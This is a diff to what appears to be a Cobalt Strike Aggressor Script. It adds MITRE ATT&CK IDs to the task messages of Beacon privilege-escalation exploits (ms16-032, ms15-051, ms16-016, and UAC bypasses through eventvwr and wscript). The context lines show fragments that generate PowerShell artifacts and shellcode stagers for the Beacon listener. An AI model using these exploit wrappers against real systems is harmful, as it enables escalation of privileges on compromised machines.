@@ -9,7 +9,7 @@ sub ms16_032_exploit {
 	local('$script $oneliner');
 
 	# acknowledge this command
-	btask($1, "Tasked Beacon to run " . listener_describe($2) . " via ms16-032");
+	btask($1, "Tasked Beacon to run " . listener_describe($2) . " via ms16-032", "T1068");
 
 	# generate a PowerShell script to run our Beacon listener
 	$script = artifact($2, "powershell");
@@ -35,7 +35,7 @@ beacon_exploit_register("ms16-032", "Secondary Logon Handle Privilege Escalation
 
 sub eventvwr_exploit {
 	# acknowledge this command
-	btask($1, "Tasked Beacon to run " . listener_describe($2) . " in a high integrity context");
+	btask($1, "Tasked Beacon to run " . listener_describe($2) . " in a high integrity context", "T1088");
 
 	# generate a PowerShell script to run our Beacon listener
 	$script = artifact($2, "powershell");
@@ -58,7 +58,7 @@ beacon_exploit_register("uac-eventvwr", "Bypass UAC with eventvwr.exe", &eventvw
 
 sub wscript_exploit {
 	# acknowledge this command
-	btask($1, "Tasked Beacon to run " . listener_describe($2) . " in a high integrity context");
+	btask($1, "Tasked Beacon to run " . listener_describe($2) . " in a high integrity context", "T1088");
 
 	# generate a PowerShell script to run our Beacon listener
 	$script = artifact($2, "powershell");
@@ -81,7 +81,7 @@ beacon_exploit_register("uac-wscript", "Bypass UAC with wscript.exe", &wscript_e
 
 sub ms15_051_exploit {
 	# acknowledge this command
-	btask($1, "Task Beacon to run " . listener_describe($2) . " via ms15-051");
+	btask($1, "Task Beacon to run " . listener_describe($2) . " via ms15-051", "T1068");
 
 	# tune our parameters based on the target arch
 	if (-is64 $1) {
@@ -122,7 +122,7 @@ sub ms16_016_exploit {
 	}
 
 	# acknowledge this command
-	btask($1, "Task Beacon to run " . listener_describe($2) . " via ms16-016");
+	btask($1, "Task Beacon to run " . listener_describe($2) . " via ms16-016", "T1068");
 
 	# generate our shellcode
 	$stager = shellcode($2, false, "x86");
